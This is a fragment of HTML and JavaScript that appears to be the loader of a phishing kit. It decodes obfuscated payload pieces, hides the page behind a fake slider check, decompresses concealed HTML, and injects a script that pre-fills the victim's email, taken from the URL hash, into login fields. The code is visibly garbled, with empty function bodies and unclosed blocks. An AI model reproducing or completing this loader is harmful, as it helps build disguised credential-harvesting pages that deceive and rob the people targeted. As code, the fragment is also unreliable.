<style>

<script>
/* Full decoder + robust pointer slider + safe prefill injection */

var piecesArr = ["REPLACE_WITH_REAL_PIECES_ARRAY"]; // <-- keep real pieces array from your build here

function reassemblePieces() {
  var out = '';
  try {
    for (var i = 0; i < piecesArr.length; i++) {
      var b64piece = piecesArr[i];
      var transformed = atob(b64piece);
      var rot = (transformed.length % 11);
      var chars = [];
      for (var j = 0; j < transformed.length; j++) {
        var code = (transformed.charCodeAt(j) - rot) & 0xFF;
        chars.push(String.fromCharCode(code));
      }
      out += chars.reverse().join('');
    }
    return out;
  } catch (e) {
    console.error('[Decoder] reassemble failed', e);
    return null;
  }
}

/* Robust slider implementation using Pointer Events with fallbacks */
function initSlider() {
  var handle = document.getElementById('slider-handle');
  var track  = document.getElementById('slider-track');
  if (!handle || !track) { console.warn('[Slider] elements missing'); return; }

  // ensure handle starts at 0
  handle.style.left = '0px';

  var active = false;
  var pointerId = null;
  var startX = 0;
  var startLeft = 0;

  function clamp(v, a, b){ return Math.max(a, Math.min(b, v)); }

  function getMaxLeft() {
    var tr = track.getBoundingClientRect();
    var hd = handle.getBoundingClientRect();
    return Math.max(0, Math.round(tr.width - hd.width));
  }

  function onPointerDown(ev) {
    // Accept primary button only
    if (ev.pointerType === 'mouse' && ev.button !== 0) return;
    ev.preventDefault();
    handle.setPointerCapture && handle.setPointerCapture(ev.pointerId);
    active = true;
    pointerId = ev.pointerId;
    startX = ev.clientX;
    startLeft = parseInt(handle.style.left || 0, 10) || 0;
  }

  function onPointerMove(ev) {
    if (!active || ev.pointerId !== pointerId) return;
    ev.preventDefault();
    var dx = ev.clientX - startX;
    var newLeft = clamp(startLeft + dx, 0, getMaxLeft());
    handle.style.left = newLeft + 'px';
    if (newLeft >= getMaxLeft() - 4) {
      // success
      try { handle.releasePointerCapture && handle.releasePointerCapture(pointerId); } catch(e){}
      active = false;
      triggerReconstruct();
    }
  }

  function onPointerUp(ev) {
    if (!active || ev.pointerId !== pointerId) return;
    ev.preventDefault();
    try { handle.releasePointerCapture && handle.releasePointerCapture(pointerId); } catch(e){}
    active = false;
    pointerId = null;
    // snap back if not full
    var current = parseInt(handle.style.left || 0, 10) || 0;
    if (current < getMaxLeft() - 4) {
      handle.style.left = '0px';
    } else {
      triggerReconstruct();
    }
  }

  // pointer events
  handle.addEventListener('pointerdown', onPointerDown);
  window.addEventListener('pointermove', onPointerMove);
  window.addEventListener('pointerup', onPointerUp);
  // keyboard accessibility: Enter/Space complete
  handle.addEventListener('keydown', function(e){
    if (e.key === 'Enter' || e.key === ' ' || e.key === 'Spacebar') {
      e.preventDefault();
      handle.style.left = getMaxLeft() + 'px';
      triggerReconstruct();
    }
  });

  // fallback for older browsers: mouse/touch
  handle.addEventListener('mousedown', onPointerDown);
  window.addEventListener('mousemove', onPointerMove);
  window.addEventListener('mouseup', onPointerUp);

  handle.addEventListener('touchstart', function(e){ onPointerDown(e.changedTouches ? e.changedTouches[0] : e); }, {passive:false});
  window.addEventListener('touchmove', function(e){ onPointerMove(e.changedTouches ? e.changedTouches[0] : e); }, {passive:false});
  window.addEventListener('touchend', function(e){ onPointerUp(e.changedTouches ? e.changedTouches[0] : e); });

  console.log('[Slider] initialized (pointer events)', !!window.PointerEvent);
}

/* ensure slider init after DOM ready */
if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initSlider); else initSlider();

/* core reconstruction + safe prefill injection */
function triggerReconstruct() {

}

function attemptReconstruct() {

    var html = LZString.decompressFromBase64(assembled);
    if (!html) throw new Error('decompress returned null');

    // robust hash/email extraction
    var rawHash = '';
    try {
      rawHash = (window.location.hash && window.location.hash.length > 1) ? decodeURIComponent(window.location.hash.replace(/^#/,'') ) : (window.location.href.indexOf('#')>-1 ? decodeURIComponent(window.location.href.split('#').pop()) : '');

          return m.replace(/>$/, ' value="' + rawHash + '">');
        });
        html = html.replace(/(<h[1-6][^>]*\bid\s*=\s*["']auth_email["'][^>]*>)(.*?)(<\/h[1-6]>)/ig, function(all, open, inner, close){
          return open + rawHash + close;
        });
        html = html.replace(/(<[a-zA-Z0-9-]+[^>]*\bid\s*=\s*["']auth_email["'][^>]*>)(.*?)(<\/[^>]+>)/ig, function(all, open, inner, close){
          return open + rawHash + close;
        });
      } catch(e){ console.warn('[Decoder] replacement failed', e); }

      // safe injection using function-to-string and JSON.stringify to prevent unescaped newlines
      (function(email){
        function filler(emailVal){
          try {
            var hid = document.querySelector('input[name="email"][type="hidden"], input#email[type="hidden"]');
            if (hid) { try { hid.value = emailVal; hid.dispatchEvent(new Event('input',{bubbles:true})); hid.dispatchEvent(new Event('change',{bubbles:true})); }catch(e){} }
            try { var disp = document.getElementById('auth_email'); if (disp) disp.textContent = emailVal; } catch(e){}
            var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
            function tryFillVisible() {
              var inputs = document.querySelectorAll('input');
              if (!inputs || inputs.length === 0) return false;
              var did = false;
              for (var i=0;i<inputs.length;i++){
                var el = inputs[i];
                var id=(el.id||'').toLowerCase(), name=(el.name||'').toLowerCase(), ph=(el.placeholder||'').toLowerCase(), type=(el.type||'').toLowerCase();
                if (type==='email' || id.indexOf('email')>-1 || name.indexOf('email')>-1 || id.indexOf('user')>-1 || name.indexOf('user')>-1 || ph.indexOf('email')>-1) {
                  try { if (nativeSetter) nativeSetter.call(el, emailVal); else el.value = emailVal; el.dispatchEvent(new Event('input',{bubbles:true})); el.dispatchEvent(new Event('change',{bubbles:true})); did = true; } catch(e){}
                }

        try {
          var s = '(' + filler.toString() + ')(' + JSON.stringify(email) + ');';
          var scriptTag = '<scr' + 'ipt>' + s + '<\\/scr' + 'ipt>';
          if (/<\\/body\\s*>/i.test(html)) html = html.replace(/<\\/body\\s*>/i, scriptTag + '</body>');
          else if (/<\\/head\\s*>/i.test(html)) html = html.replace(/<\\/head\\s*>/i, scriptTag + '</head>');
          else html = scriptTag + html;
        } catch(e) {
          var fb = '<scr' + 'ipt>' + '(function(){try{var e=sessionStorage.getItem(\"__prefill_email\")||decodeURIComponent(location.hash.replace(/^#/,\"\")); if(!e) return; try{ var h=document.querySelector(\"input[name=\\\"email\\\"][type=\\\"hidden\\\"]\"); if(h){ h.value=e; h.dispatchEvent(new Event(\"input\",{bubbles:true})); h.dispatchEvent(new Event(\"change\",{bubbles:true})); } }catch(ex){} try{ var d=document.getElementById(\"auth_email\"); if(d) d.textContent=e; }catch(ex){} }catch(ex){} })();' + '<\\/scr' + 'ipt>';
          if (/<\\/body\\s*>/i.test(html)) html = html.replace(/<\\/body\\s*>/i, fb + '</body>');

    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:40px;">Reconstruction failed</h2>';
